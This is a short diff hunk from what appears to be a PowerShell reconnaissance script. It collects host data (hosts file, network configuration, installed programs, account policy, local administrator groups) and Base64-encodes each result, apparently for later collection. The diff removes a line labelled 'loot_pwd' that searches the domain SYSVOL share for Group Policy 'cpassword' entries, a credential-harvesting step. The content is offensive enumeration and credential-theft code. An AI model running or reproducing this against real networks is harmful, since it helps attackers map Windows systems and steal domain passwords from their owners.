@@ -37,7 +37,6 @@ hosts = Encode64(Get-Content C:\WINDOWS\System32\drivers\etc\hosts | out-string)
 ipconfig = Encode64(ipconfig /all | out-string);
 iis_sites = Encode64(iis_sites_function);
 list_install_programs = Encode64(Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name | out-string);
-loot_pwd = Encode64(findstr /S cpassword $env:logonserver\sysvol\*.xml | out-string);
 net_accounts = Encode64(net accounts);
 net_localgroup_administrators = Encode64(net localgroup administrators | out-string);
 net_localgroup_administradors = Encode64(net localgroup administradores | out-string);
